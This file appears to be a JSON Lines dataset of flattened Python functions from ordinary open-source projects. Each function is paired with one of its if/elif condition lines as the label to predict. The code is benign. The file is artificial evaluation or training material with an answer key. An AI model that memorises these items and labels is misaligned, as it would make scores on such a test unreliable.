{"input": "def split_file(self, filename, block_size=2 ** 20): with open(filename, \"rb\") as f: file_list = [] while True: data = f.read(block_size) if not data: break filehash = os.path.join(self.resource_dir, self.__count_hash(data)) filehash = os.path.normpath(filehash) with open(filehash, \"wb\") as fwb: fwb.write(data) file_list.append(filehash) return file_list", "label": "if not data :"}
{"input": "def _set_live(self, live, _): if live is not None and not self.live: if isinstance(live, basestring): live = [live] # Default is to use Memory analysis. if len(live) == 0: mode = \"Memory\" elif len(live) == 1: mode = live[0] else: raise RuntimeError(\"--live parameter should specify only one mode.\") live_plugin = self.session.plugins.live(mode=mode) live_plugin.live() # When the session is destroyed, close the live plugin. self.session.register_flush_hook(self, live_plugin.close) return live", "label": "elif len ( live ) == 1 :"}
{"input": "def process_percent(token, state, command_line): if not state.is_range_start_line_parsed: if command_line.line_range.start: raise ValueError(\"bad range: {0}\".format(state.scanner.state.source)) command_line.line_range.start.append(token) else: if command_line.line_range.end: raise ValueError(\"bad range: {0}\".format(state.scanner.state.source)) command_line.line_range.end.append(token) return parse_line_ref, command_line", "label": "if command_line . line_range . start :"}
{"input": "def gprv_implicit_orax(ii): for i, op in enumerate(_gen_opnds(ii)): if i == 0: if op.name == \"REG0\" and op_luf(op, \"GPRv_SB\"): continue else: return False elif i == 1: if op.name == \"REG1\" and op_luf(op, \"OrAX\"): continue else: return False else: return False return True", "label": "if op . name == \"REG1\" and op_luf ( op , \"OrAX\" ) :"}
{"input": "def _check_events(self): # make sure song-started and song-ended match up stack = [] old = self.events[:] for type_, song in self.events: if type_ == \"started\": stack.append(song) elif type_ == \"ended\": self.assertTrue(stack.pop(-1) is song, msg=old) self.assertFalse(stack, msg=old)", "label": "if type_ == \"started\" :"}
{"input": "def _minimal_replacement_cost(self, first, second): first_symbols, second_symbols = set(), set() removal_cost, insertion_cost = 0, 0 for a, b in itertools.zip_longest(first, second, fillvalue=None): if a is not None: first_symbols.add(a) if b is not None: second_symbols.add(b) removal_cost = max(removal_cost, len(first_symbols - second_symbols)) insertion_cost = max(insertion_cost, len(second_symbols - first_symbols)) return min(removal_cost, insertion_cost)", "label": "if b is not None :"}
{"input": "def get_default_backend(self, user_backends): retval = None n_defaults = 0 for name in user_backends: args = user_backends.get(name) if args.get(\"default\", False): n_defaults = n_defaults + 1 if retval is None: retval = name return (retval, n_defaults)", "label": "if args . get ( \"default\" , False ) :"}
{"input": "def ensure_echo_on(): if termios: fd = sys.stdin if fd.isatty(): attr_list = termios.tcgetattr(fd) if not attr_list[3] & termios.ECHO: attr_list[3] |= termios.ECHO if hasattr(signal, \"SIGTTOU\"): old_handler = signal.signal(signal.SIGTTOU, signal.SIG_IGN) else: old_handler = None termios.tcsetattr(fd, termios.TCSANOW, attr_list) if old_handler is not None: signal.signal(signal.SIGTTOU, old_handler)", "label": "if old_handler is not None :"}
{"input": "def load_dashboard_module_view(request, pk): result = {\"error\": False} try: if not user_is_authenticated(request.user) or not request.user.is_staff: raise ValidationError(\"error\") instance = UserDashboardModule.objects.get(pk=pk, user=request.user.pk) module_cls = instance.load_module() module = module_cls(model=instance, context={\"request\": request}) result[\"html\"] = module.render() except (ValidationError, UserDashboardModule.DoesNotExist): result[\"error\"] = True return JsonResponse(result)", "label": "if not user_is_authenticated ( request . user ) or not request . user . is_staff :"}
{"input": "def _validate_compatible(from_schema, to_schema): if set(from_schema.names) != set(to_schema.names): raise com.IbisInputError(\"Schemas have different names\") for name in from_schema: lt = from_schema[name] rt = to_schema[name] if not lt.castable(rt): raise com.IbisInputError(\"Cannot safely cast {0!r} to {1!r}\".format(lt, rt)) return", "label": "if not lt . castable ( rt ) :"}
{"input": "def load_yaml(self): if \"FUEL_CONFIG\" in os.environ: yaml_file = os.environ[\"FUEL_CONFIG\"] else: yaml_file = os.path.expanduser(\"~/.fuelrc\") if os.path.isfile(yaml_file): with open(yaml_file) as f: for key, value in yaml.safe_load(f).items(): if key not in self.config: raise ValueError(\"Unrecognized config in YAML: {}\".format(key)) self.config[key][\"yaml\"] = value", "label": "if key not in self . config :"}
{"input": "def process(self): if not self.outputs[\"Polygons\"].is_linked: return verts = self.inputs[\"Vertices\"].sv_get() faces = self.inputs[\"Polygons\"].sv_get() if not len(verts) == len(faces): return verts_out = [] polys_out = [] for v_obj, f_obj in zip(verts, faces): res = join_tris(v_obj, f_obj, self) if not res: return verts_out.append(res[0]) polys_out.append(res[1]) self.outputs[\"Vertices\"].sv_set(verts_out) self.outputs[\"Polygons\"].sv_set(polys_out)", "label": "if not res :"}
{"input": "def _set_momentum(self, runner, momentum_groups): for param_group, mom in zip(runner.optimizer.param_groups, momentum_groups): if \"momentum\" in param_group.keys(): param_group[\"momentum\"] = mom elif \"betas\" in param_group.keys(): param_group[\"betas\"] = (mom, param_group[\"betas\"][1])", "label": "elif \"betas\" in param_group . keys ( ) :"}
{"input": "def getReceiptInfo(pkgname): \"\"\"Get receipt info from a package\"\"\" info = [] if hasValidPackageExt(pkgname): display.display_debug2(\"Examining %s\" % pkgname) if os.path.isfile(pkgname): # new flat package info = getFlatPackageInfo(pkgname) if os.path.isdir(pkgname): # bundle-style package? info = getBundlePackageInfo(pkgname) elif pkgname.endswith(\".dist\"): info = parsePkgRefs(pkgname) return info", "label": "if os . path . isdir ( pkgname ) :"}
{"input": "def _add_directory_child(self, children, filename): if os.path.isdir(filename): children.append(self._directory_controller(filename)) else: r = self._namespace.get_resource(filename, report_status=False) if self._is_valid_resource(r): children.append(self._resource_controller(r))", "label": "if self . _is_valid_resource ( r ) :"}
{"input": "def check_br_addr(self, br): ips = {} cmd = \"ip a show dev %s\" % br for line in self.execute(cmd, sudo=True).split(\"\\n\"): if line.strip().startswith(\"inet \"): elems = [e.strip() for e in line.strip().split(\" \")] ips[4] = elems[1] elif line.strip().startswith(\"inet6 \"): elems = [e.strip() for e in line.strip().split(\" \")] ips[6] = elems[1] return ips", "label": "elif line . strip ( ) . startswith ( \"inet6 \" ) :"}
{"input": "def execute(self, statement, parameters=None): try: if parameters: result = self.real_cursor.execute(statement, parameters) else: result = self.real_cursor.execute(statement) return result except: raise Error(sys.exc_info()[1])", "label": "if parameters :"}
{"input": "def isUpdateAvailable(self, localOnly=False): nsp = self.getLatestFile() if not nsp: if not nsp: if not self.isUpdate or (self.version and int(self.version) > 0): return True else: return False try: latest = self.lastestVersion(localOnly=localOnly) if latest is None: return False if int(nsp.version) < int(latest): return True except BaseException as e: Print.error(\"isUpdateAvailable exception %s: %s\" % (self.id, str(e))) pass return False", "label": "if not nsp :"}
{"input": "def align(size): if size <= 4096: # Small if is_power2(size): return size elif size < 128: return min_ge(range(16, 128 + 1, 16), size) elif size < 512: return min_ge(range(192, 512 + 1, 64), size) else: return min_ge(range(768, 4096 + 1, 256), size) elif size < 4194304: # Large return min_ge(range(4096, 4194304 + 1, 4096), size) else: # Huge return min_ge(range(4194304, 536870912 + 1, 4194304), size)", "label": "if is_power2 ( size ) :"}
{"input": "def __init__(self, transforms): assert isinstance(transforms, collections.abc.Sequence) self.transforms = [] for transform in transforms: if isinstance(transform, dict): transform = build_from_cfg(transform, PIPELINES) self.transforms.append(transform) elif callable(transform): self.transforms.append(transform) else: raise TypeError(\"transform must be callable or a dict\")", "label": "if isinstance ( transform , dict ) :"}
{"input": "def branch_name_from_config_file(directory, config_file): ans = None try: with open(config_file, \"rb\") as f: for line in f: m = nick_pat.match(line) if m is not None: ans = ( m.group(1) .strip() .decode(get_preferred_file_contents_encoding(), \"replace\") ) break except Exception: pass return ans or os.path.basename(directory)", "label": "if m is not None :"}
{"input": "def do_acquire_write_lock(self, wait): owner_id = self._get_owner_id() while True: if self.client.setnx(self.identifier, owner_id): self.client.pexpire(self.identifier, self.LOCK_EXPIRATION * 1000) return True if not wait: return False time.sleep(0.2)", "label": "if not wait :"}
{"input": "def add_files_for_package(sub_package_path, root_package_path, root_package_name): for root, dirs, files in os.walk(sub_package_path): if \".svn\" in dirs: dirs.remove(\".svn\") for f in files: if not f.endswith(\".pyc\") and not f.startswith(\".\"): add( dereference(root + \"/\" + f), root.replace(root_package_path, root_package_name) + \"/\" + f, )", "label": "if \".svn\" in dirs :"}
{"input": "def collect_state(object_name, prefix, d): if d[None] is False: return [] result = [] if d[None] is True and prefix is not None: name = v.make_measurement_choice(object_name, prefix) if name in choices: result.append(name) for key in [x for x in list(d.keys()) if x is not None]: if prefix is None: sub_prefix = key else: sub_prefix = \"_\".join((prefix, key)) result += collect_state(object_name, sub_prefix, d[key]) return result", "label": "if prefix is None :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_app_id(d.getPrefixedString()) continue if tt == 16: self.set_num_memcacheg_backends(d.getVarInt32()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 10 :"}
{"input": "def check(dbdef): \"database version must include required keys\" for vnum, vdef in dbdef.items(): missing = set(required) - set(vdef) if vnum == min(dbdef): missing -= set(initially_ok) if missing: yield vnum, missing", "label": "if vnum == min ( dbdef ) :"}
{"input": "def _check(ret): if hasattr(ret, \"value\"): ret = ret.value if ret != 0: if ret == OPENUSB_IO_TIMEOUT: raise USBTimeoutError(_lib.openusb_strerror(ret), ret, _openusb_errno[ret]) else: raise USBError(_lib.openusb_strerror(ret), ret, _openusb_errno[ret]) return ret", "label": "if ret == OPENUSB_IO_TIMEOUT :"}
{"input": "def scroll_to(self, x=None, y=None): if x is None or y is None: pos = self.tab.get_scroll_position() x = pos[\"x\"] if x is None else x y = pos[\"y\"] if y is None else y for value, name in [(x, \"x\"), (y, \"y\")]: if not isinstance(value, (int, float)): raise ScriptError( { \"argument\": name, \"message\": \"scroll {} coordinate must be \" \"a number, got {}\".format(name, repr(value)), } ) self.tab.set_scroll_position(x, y)", "label": "if not isinstance ( value , ( int , float ) ) :"}
{"input": "def _validate_secret_list(self, secrets, expected): for secret in secrets: if secret.name in expected.keys(): expected_secret = expected[secret.name] self._assert_secret_attributes_equal(expected_secret.properties, secret) del expected[secret.name] self.assertEqual(len(expected), 0)", "label": "if secret . name in expected . keys ( ) :"}
{"input": "def _capture_hub(self, create): # Subclasses should call this as the first action from any # public method that could, in theory, block and switch # to the hub. This may release the GIL. if self.hub is None: # This next line might release the GIL. current_hub = get_hub() if create else get_hub_if_exists() if current_hub is None: return # We have the GIL again. Did anything change? If so, # we lost the race. if self.hub is None: self.hub = current_hub", "label": "if self . hub is None :"}
{"input": "def _hashable(self): hashes = [self.graph.md5()] for g in self.geometry.values(): if hasattr(g, \"md5\"): hashes.append(g.md5()) elif hasattr(g, \"tostring\"): hashes.append(str(hash(g.tostring()))) else: # try to just straight up hash # this may raise errors hashes.append(str(hash(g))) hashable = \"\".join(sorted(hashes)).encode(\"utf-8\") return hashable", "label": "elif hasattr ( g , \"tostring\" ) :"}
{"input": "def load_distribution(args: CommandLineArguments) -> CommandLineArguments: if args.distribution is not None: args.distribution = Distribution[args.distribution] if args.distribution is None or args.release is None: d, r = detect_distribution() if args.distribution is None: args.distribution = d if args.distribution == d and d != Distribution.clear and args.release is None: args.release = r if args.distribution is None: die(\"Couldn't detect distribution.\") return args", "label": "if args . distribution is None :"}
{"input": "def is_different(item, seen): is_diff = True if item not in seen: for value in other: if comparator(iteratee(item), iteratee(value)): is_diff = False break if is_diff: seen.append(item) return is_diff", "label": "if is_diff :"}
{"input": "def _find_first_unescaped(dn, char, pos): while True: pos = dn.find(char, pos) if pos == -1: break # no char found if pos > 0 and dn[pos - 1] != \"\\\\\": # unescaped char break elif pos > 1 and dn[pos - 1] == \"\\\\\": # may be unescaped escaped = True for c in dn[pos - 2 : 0 : -1]: if c == \"\\\\\": escaped = not escaped else: break if not escaped: break pos += 1 return pos", "label": "if c == \"\\\\\" :"}
{"input": "def vcf_has_nonfiltered_variants(in_file): if os.path.exists(in_file): with utils.open_gzipsafe(in_file) as in_handle: for line in in_handle: if line.strip() and not line.startswith(\"#\"): parts = line.split(\"\\t\") if parts[6] in set([\"PASS\", \".\"]): return True return False", "label": "if line . strip ( ) and not line . startswith ( \"#\" ) :"}
{"input": "def clean_vendor(ctx, vendor_dir): # Old _vendor cleanup remove_all(vendor_dir.glob(\"*.pyc\")) log(\"Cleaning %s\" % vendor_dir) for item in vendor_dir.iterdir(): if item.is_dir(): shutil.rmtree(str(item)) elif item.name not in FILE_WHITE_LIST: item.unlink() else: log(\"Skipping %s\" % item)", "label": "elif item . name not in FILE_WHITE_LIST :"}
{"input": "def sel_line(view, s): if mode == modes.INTERNAL_NORMAL: if count == 1: if view.line(s.b).size() > 0: eol = view.line(s.b).b begin = view.line(s.b).a begin = utils.next_non_white_space_char(view, begin, white_space=\" \\t\") return R(begin, eol) return s return s", "label": "if count == 1 :"}
{"input": "def _struct(self, fields): result = {} for field in fields: if field[0] == \"__parent\": parent = self.instance(field[1]) if isinstance(parent, dict): result.update(parent) elif len(fields) == 1: result = parent else: result[field[0]] = parent else: result[field[0]] = self.instance(field[1]) return result", "label": "if field [ 0 ] == \"__parent\" :"}
{"input": "def _decode_list(lst): if not PY2: return lst newlist = [] for i in lst: if isinstance(i, string_types): i = to_bytes(i) elif isinstance(i, list): i = _decode_list(i) newlist.append(i) return newlist", "label": "if isinstance ( i , string_types ) :"}
{"input": "def _check_arguments(self, arch, state): # TODO: add calling convention detection to individual functions, and use that instead of the # TODO: default calling convention of the platform cc = DEFAULT_CC[arch.name](arch) # type: s_cc.SimCC for i, expected_arg in enumerate(self.arguments): if expected_arg is None: continue real_arg = cc.arg(state, i) expected_arg_type, expected_arg_value = expected_arg r = self._compare_arguments( state, expected_arg_type, expected_arg_value, real_arg ) if not r: return False return True", "label": "if expected_arg is None :"}
{"input": "def _strip_classy_blocks(self, module): for name, child_module in module.named_children(): if isinstance(child_module, ClassyBlock): module.add_module(name, child_module.wrapped_module()) self._strip_classy_blocks(child_module)", "label": "if isinstance ( child_module , ClassyBlock ) :"}
{"input": "def test_07_verify_degraded_pool_alert_list_exist_and_get_id(): global alert_id results = GET(\"/alert/list/\") assert results.status_code == 200, results.text assert isinstance(results.json(), list), results.text for line in results.json(): if line[\"source\"] == \"VolumeStatus\": alert_id = results.json()[0][\"id\"] assert results.json()[0][\"args\"][\"volume\"] == pool_name, results.text assert results.json()[0][\"args\"][\"state\"] == \"DEGRADED\", results.text assert results.json()[0][\"level\"] == \"CRITICAL\", results.text break", "label": "if line [ \"source\" ] == \"VolumeStatus\" :"}
{"input": "def parseApplicationExtension(parent): yield PascalString8(parent, \"app_name\", \"Application name\") yield UInt8(parent, \"size\") size = parent[\"size\"].value if parent[\"app_name\"].value == \"NETSCAPE2.0\" and size == 3: yield Enum(UInt8(parent, \"netscape_code\"), NETSCAPE_CODE) if parent[\"netscape_code\"].value == 1: yield UInt16(parent, \"loop_count\") else: yield RawBytes(parent, \"raw\", 2) else: yield RawBytes(parent, \"raw\", size) yield NullBytes(parent, \"terminator\", 1, \"Terminator (0)\")", "label": "if parent [ \"netscape_code\" ] . value == 1 :"}
{"input": "def tearDownClass(self): settings.TIME_ZONE = connection.settings_dict[\"TIME_ZONE\"] = self._old_time_zone timezone._localtime = None if TZ_SUPPORT: if self._old_tz is None: del os.environ[\"TZ\"] else: os.environ[\"TZ\"] = self._old_tz time.tzset()", "label": "if self . _old_tz is None :"}
{"input": "def __getattr__(self, key): if key in self._raw: val = self._raw[key] if key in (\"date\",): return pd.Timestamp(val) elif key in (\"open\", \"close\"): return pd.Timestamp(val).time() elif key in (\"session_open\", \"session_close\"): return pd.Timestamp(val[:2] + \":\" + val[-2:]).time() else: return val return super().__getattr__(key)", "label": "elif key in ( \"open\" , \"close\" ) :"}
{"input": "def _extract_knob_feature_log(arg): \"\"\"extract knob feature for log items\"\"\" try: inp, res = arg config = inp.config x = config.get_flatten_feature() if res.error_no == 0: with inp.target: # necessary, for calculating flops of this task inp.task.instantiate(config) y = inp.task.flop / np.mean(res.costs) else: y = 0.0 return x, y except Exception: # pylint: disable=broad-except return None", "label": "if res . error_no == 0 :"}
{"input": "def dvipng_hack_alpha(): stdin, stdout = os.popen4(\"dvipng -version\") for line in stdout: if line.startswith(\"dvipng \"): version = line.split()[-1] mpl.verbose.report(\"Found dvipng version %s\" % version, \"helpful\") version = distutils.version.LooseVersion(version) return version < distutils.version.LooseVersion(\"1.6\") raise RuntimeError(\"Could not obtain dvipng version\")", "label": "if line . startswith ( \"dvipng \" ) :"}
{"input": "def _get_func_name(self, current_cls: Generic, module_func_dict: dict) -> Optional[str]: mod = current_cls.__module__ + \".\" + current_cls.__name__ if mod in module_func_dict: _func_name = module_func_dict[mod] return _func_name elif current_cls.__bases__: for base_class in current_cls.__bases__: base_run_func = self._get_func_name(base_class, module_func_dict) if base_run_func: return base_run_func else: return None", "label": "if base_run_func :"}
{"input": "def __getitem__(self, key): if isinstance(key, numbers.Number): l = len(self) if key >= l: raise IndexError(\"Index %s out of range (%s elements)\" % (key, l)) if key < 0: if key < -l: raise IndexError(\"Index %s out of range (%s elements)\" % (key, l)) key += l return self(key + 1) elif isinstance(key, slice): raise ValueError( self.impl.__class__.__name__ + \" object does not support slicing\" ) else: return self(key)", "label": "if key >= l :"}
{"input": "def add_user_functions(self): for udf in user_functions: if type(udf.func_or_obj) == type(object): self.conn.create_aggregate(udf.name, udf.param_count, udf.func_or_obj) elif type(udf.func_or_obj) == type(md5): self.conn.create_function(udf.name, udf.param_count, udf.func_or_obj) else: raise Exception(\"Invalid user function definition %s\" % str(udf))", "label": "if type ( udf . func_or_obj ) == type ( object ) :"}
{"input": "def _get_schema_references(self, s): refs = set() if isinstance(s, dict): for k, v in s.items(): if isinstance(v, six.string_types): m = self.__jsonschema_ref_ex.match(v) if m: refs.add(m.group(1)) continue elif k in (\"oneOf\", \"anyOf\") and isinstance(v, list): refs.update(*map(self._get_schema_references, v)) refs.update(self._get_schema_references(v)) return refs", "label": "if m :"}
{"input": "def create_model_handler(ns, model_type): @route(f\"/<provider>/{ns}/<model_id>\") @use_provider def handle(req, provider, model_id): # special cases: # fuo://<provider>/users/me -> show current logged user if model_type == ModelType.user: if model_id == \"me\": user = getattr(provider, \"_user\", None) if user is None: raise CmdException(f\"log in provider:{provider.identifier} first\") return user model = get_model_or_raise(provider, model_type, model_id) return model", "label": "if user is None :"}
{"input": "def stream_read_bz2(ifh, ofh): \"\"\"Uncompress bz2 compressed *ifh* into *ofh*\"\"\" decompressor = bz2.BZ2Decompressor() while True: buf = ifh.read(BUFSIZE) if not buf: break buf = decompressor.decompress(buf) if buf: ofh.write(buf) if decompressor.unused_data or ifh.read(1) != b\"\": raise CorruptedObjectError(\"Data after end of bz2 stream\")", "label": "if buf :"}
{"input": "def copy_layer( layer, keep_bias=True, name_template=None, weights=None, reuse_symbolic_tensors=True, **kwargs ): config = layer.get_config() if name_template is None: config[\"name\"] = None else: config[\"name\"] = name_template % config[\"name\"] if keep_bias is False and config.get(\"use_bias\", False): config[\"use_bias\"] = False if weights is None: if reuse_symbolic_tensors: weights = layer.weights[:-1] else: weights = layer.get_weights()[:-1] return get_layer_from_config(layer, config, weights=weights, **kwargs)", "label": "if weights is None :"}
{"input": "def do_status(self, directory, path): with self._repo(directory) as repo: if path: path = os.path.join(directory, path) statuses = repo.status(include=path, all=True) for status, paths in statuses: if paths: return self.statuses[status][0] return None else: resulting_status = 0 for status, paths in repo.status(all=True): if paths: resulting_status |= self.statuses[status][1] return self.repo_statuses_str[resulting_status]", "label": "if path :"}
{"input": "def close(self): if self.changed: save = EasyDialogs.AskYesNoCancel( 'Save window \"%s\" before closing?' % self.name, 1 ) if save > 0: self.menu_save() elif save < 0: return if self.parent.active == self: self.parent.active = None self.parent.updatemenubar() del self.ted self.do_postclose()", "label": "elif save < 0 :"}
{"input": "def _Return(self, t): self._fill(\"return \") if t.value: if isinstance(t.value, Tuple): text = \", \".join([name.name for name in t.value.asList()]) self._write(text) else: self._dispatch(t.value) if not self._do_indent: self._write(\"; \")", "label": "if isinstance ( t . value , Tuple ) :"}
{"input": "def __init__(self, itemtype, cnf={}, *, master=None, **kw): if not master: if \"refwindow\" in kw: master = kw[\"refwindow\"] elif \"refwindow\" in cnf: master = cnf[\"refwindow\"] else: master = tkinter._default_root if not master: raise RuntimeError( \"Too early to create display style: \" \"no root window\" ) self.tk = master.tk self.stylename = self.tk.call(\"tixDisplayStyle\", itemtype, *self._options(cnf, kw))", "label": "elif \"refwindow\" in cnf :"}
{"input": "def _load_items(self, splits): \"\"\"Load individual image indices from splits.\"\"\" ids = list() for name in splits: root = os.path.join(self._root, \"VisDrone2019-DET-\" + name) images_dir = self._images_dir.format(root) images = [ f[:-4] for f in os.listdir(images_dir) if os.path.isfile(os.path.join(images_dir, f)) and f[-3:] == \"jpg\" ] ids += [(root, line.strip()) for line in images] return ids", "label": "if os . path . isfile ( os . path . join ( images_dir , f ) ) and f [ - 3 : ] == \"jpg\""}
{"input": "def _gen_langs_in_db(self): for d in os.listdir(join(self.base_dir, \"db\")): if d in self._non_lang_db_dirs: continue lang_path = join(self.base_dir, \"db\", d, \"lang\") if not exists(lang_path): log.warn( \"unexpected lang-zone db dir without 'lang' file: \" \"`%s' (skipping)\" % dirname(lang_path) ) continue fin = open(lang_path, \"r\") try: lang = fin.read().strip() finally: fin.close() yield lang", "label": "if d in self . _non_lang_db_dirs :"}
{"input": "def handler_click_link(self, link): if link.startswith(\"[[\"): link = link[2:-2] self.notify_observers(\"click:notelink\", link) else: if platform.system().lower() == \"windows\": os.startfile(link) elif platform.system().lower() == \"darwin\": subprocess.call((\"open\", link)) else: subprocess.call((\"xdg-open\", link))", "label": "if platform . system ( ) . lower ( ) == \"windows\" :"}
{"input": "def get_referrers(self): d = [] for o in gc.get_referrers(self.obj): name = None if isinstance(o, dict): name = web.dictfind(o, self.obj) for r in gc.get_referrers(o): if getattr(r, \"__dict__\", None) is o: o = r break elif isinstance(o, dict): # other dict types name = web.dictfind(o, self.obj) if not isinstance(name, six.string_types): name = None d.append(Object(o, name)) return d", "label": "elif isinstance ( o , dict ) :"}
{"input": "def parse_preference(path): \"\"\"parse android's shared preference xml\"\"\" storage = {} read = open(path) for line in read: line = line.strip() # <string name=\"key\">value</string> if line.startswith('<string name=\"'): index = line.find('\"', 14) key = line[14:index] value = line[index + 2 : -9] storage[key] = value read.close() return storage", "label": "if line . startswith ( '<string name=\"' ) :"}
{"input": "def __getExpectedSampleOffsets(self, tileOrigin, area1, area2): ts = GafferImage.ImagePlug.tileSize() data = [] for y in range(tileOrigin.y, tileOrigin.y + ts): for x in range(tileOrigin.x, tileOrigin.x + ts): pixel = imath.V2i(x, y) data.append(data[-1] if data else 0) if GafferImage.BufferAlgo.contains(area1, pixel): data[-1] += 1 if GafferImage.BufferAlgo.contains(area2, pixel): data[-1] += 1 return IECore.IntVectorData(data)", "label": "if GafferImage . BufferAlgo . contains ( area2 , pixel ) :"}
{"input": "def test_doc_attributes(self): print_test_name(\"TEST DOC ATTRIBUTES\") correct = 0 for example in DOC_EXAMPLES: original_schema = schema.parse(example.schema_string) if original_schema.doc is not None: correct += 1 if original_schema.type == \"record\": for f in original_schema.fields: if f.doc is None: self.fail( \"Failed to preserve 'doc' in fields: \" + example.schema_string ) self.assertEqual(correct, len(DOC_EXAMPLES))", "label": "if original_schema . doc is not None :"}
{"input": "def enter(self, node, key, parent, path, ancestors): for i, visitor in enumerate(self.visitors): if not self.skipping[i]: result = visitor.enter(node, key, parent, path, ancestors) if result is False: self.skipping[i] = node elif result is BREAK: self.skipping[i] = BREAK elif result is not None: return result", "label": "elif result is BREAK :"}
{"input": "def new_user_two_factor(): user = Journalist.query.get(request.args[\"uid\"]) if request.method == \"POST\": token = request.form[\"token\"] if user.verify_token(token): flash( gettext( \"Token in two-factor authentication \" \"accepted for user {user}.\" ).format(user=user.username), \"notification\", ) return redirect(url_for(\"admin.index\")) else: flash( gettext(\"Could not verify token in two-factor authentication.\"), \"error\" ) return render_template(\"admin_new_user_two_factor.html\", user=user)", "label": "if user . verify_token ( token ) :"}
{"input": "def _check_locations(self, locations, available_locations): for location in locations: if location not in available_locations: self.log.warning( \"List of supported locations for you is: %s\", sorted(available_locations.keys()), ) raise TaurusConfigError(\"Invalid location requested: %s\" % location)", "label": "if location not in available_locations :"}
{"input": "def find_best_layout_for_subplots(num_subplots): r, c = 1, 1 while (r * c) < num_subplots: if (c == (r + 1)) or (r == c): c += 1 elif c == (r + 2): r += 1 c -= 1 return r, c", "label": "elif c == ( r + 2 ) :"}
{"input": "def check_env(env): for name, val in env.items(): if not isinstance(name, six.string_types): raise ValueError(\"non-string env name %r\" % name) if not isinstance(val, six.string_types): raise ValueError(\"non-string env value for '%s': %r\" % (name, val))", "label": "if not isinstance ( val , six . string_types ) :"}
{"input": "def _indexes(self): # used for index_lib indexes = [] names = (\"index\", \"columns\") for ax in range(self.input.ndim): index = names[ax] val = getattr(self, index) if val is not None: indexes.append(val) else: indexes.append(slice(None)) return indexes", "label": "if val is not None :"}
{"input": "def gen(): for _ in range(256): if seq: yield self.tb.dut.i.eq(seq.pop(0)) i = yield self.tb.dut.i if (yield self.tb.dut.n): self.assertEqual(i, 0) else: o = yield self.tb.dut.o if o > 0: self.assertEqual(i & 1 << (o - 1), 0) self.assertGreaterEqual(i, 1 << o) yield", "label": "if o > 0 :"}
{"input": "def early_version(self, argv): if \"--version\" in argv: if \"--debug\" in argv: from flower.utils import bugreport print(bugreport(), file=self.stdout) print(__version__, file=self.stdout) super(FlowerCommand, self).early_version(argv)", "label": "if \"--debug\" in argv :"}
{"input": "def _lookup(self, key, dicts=None, filters=()): if dicts is None: dicts = self.dicts key_len = len(key) if key_len > self.longest_key: return None for d in dicts: if not d.enabled: continue if key_len > d.longest_key: continue value = d.get(key) if value: for f in filters: if f(key, value): return None return value", "label": "if value :"}
{"input": "def get_lang3(lang): try: if len(lang) == 2: ret_value = get(part1=lang).part3 elif len(lang) == 3: ret_value = lang else: ret_value = \"\" except KeyError: ret_value = lang return ret_value", "label": "elif len ( lang ) == 3 :"}
{"input": "def get_config_settings(): config = {} for plugin in extension_loader.MANAGER.plugins: fn_name = plugin.name function = plugin.plugin # if a function takes config... if hasattr(function, \"_takes_config\"): fn_module = importlib.import_module(function.__module__) # call the config generator if it exists if hasattr(fn_module, \"gen_config\"): config[fn_name] = fn_module.gen_config(function._takes_config) return yaml.safe_dump(config, default_flow_style=False)", "label": "if hasattr ( fn_module , \"gen_config\" ) :"}
{"input": "def _import_pathname(self, pathname, fqname): if _os_path_isdir(pathname): result = self._import_pathname(_os_path_join(pathname, \"__init__\"), fqname) if result: values = result[2] values[\"__pkgdir__\"] = pathname values[\"__path__\"] = [pathname] return 1, result[1], values return None for suffix, importFunc in self.suffixes: filename = pathname + suffix try: finfo = _os_stat(filename) except OSError: pass else: return importFunc(filename, finfo, fqname) return None", "label": "if result :"}
{"input": "def __iter__(self): with self._guard: for dp in self.ds: shp = dp[self.idx].shape holder = self.holder[shp] holder.append(dp) if len(holder) == self.batch_size: yield BatchData.aggregate_batch(holder) del holder[:]", "label": "if len ( holder ) == self . batch_size :"}
{"input": "def add_data_source(self, f=None, s_name=None, source=None, module=None, section=None): try: if module is None: module = self.name if section is None: section = \"all_sections\" if s_name is None: s_name = f[\"s_name\"] if source is None: source = os.path.abspath(os.path.join(f[\"root\"], f[\"fn\"])) report.data_sources[module][section][s_name] = source except AttributeError: logger.warning( \"Tried to add data source for {}, but was missing fields data\".format( self.name ) )", "label": "if s_name is None :"}
{"input": "def forward(self, seq, adj, sparse=False): seq_fts = self.fc(seq) if len(seq_fts.shape) > 2: if sparse: out = torch.unsqueeze(torch.spmm(adj, torch.squeeze(seq_fts, 0)), 0) else: out = torch.bmm(adj, seq_fts) else: if sparse: out = torch.spmm(adj, torch.squeeze(seq_fts, 0)) else: out = torch.mm(adj, seq_fts) if self.bias is not None: out += self.bias return self.act(out)", "label": "if sparse :"}
{"input": "def stat(self, path): \"\"\"Get attributes of a file or directory, following symlinks\"\"\" try: return SFTPAttrs.from_local(super().stat(path)) except OSError as exc: if exc.errno == errno.EACCES: raise SFTPError(FX_PERMISSION_DENIED, exc.strerror) else: raise SFTPError(FX_FAILURE, exc.strerror)", "label": "if exc . errno == errno . EACCES :"}
{"input": "def _run_eagerly(*inputs): # pylint: disable=missing-docstring with context.eager_mode(): constants = [ _wrap_as_constant(value, tensor_spec) for value, tensor_spec in zip(inputs, input_signature) ] output = fn(*constants) if hasattr(output, \"_make\"): return output._make([tensor.numpy() for tensor in output]) if isinstance(output, (tuple, list)): return [tensor.numpy() for tensor in output] else: return output.numpy()", "label": "if hasattr ( output , \"_make\" ) :"}
{"input": "def do_draw(self, data): if cu.biased_coin(data, self.__p): return data.draw(self) + data.draw(self) else: # We draw n as two separate calls so that it doesn't show up as a # single block. If it did, the heuristics that allow us to move # blocks around would fire and it would move right, which would # then allow us to shrink it more easily. n = (data.draw_bits(16) << 16) | data.draw_bits(16) if n == MAX_INT: return (POISON,) else: return (None,)", "label": "if n == MAX_INT :"}
{"input": "def object_matches_a_check(obj, checks): \"\"\"Does the object match *any* of the given checks from the \"only_cache_matching\" list?\"\"\" for check in checks: if callable(check): if check(obj): return True else: try: for field, value in check.items(): if not getattr(obj, field) == value: break else: return True except AttributeError: logger.error(\"Invalid filter for model %s, %s\", obj.__class__, check) raise return False", "label": "if callable ( check ) :"}
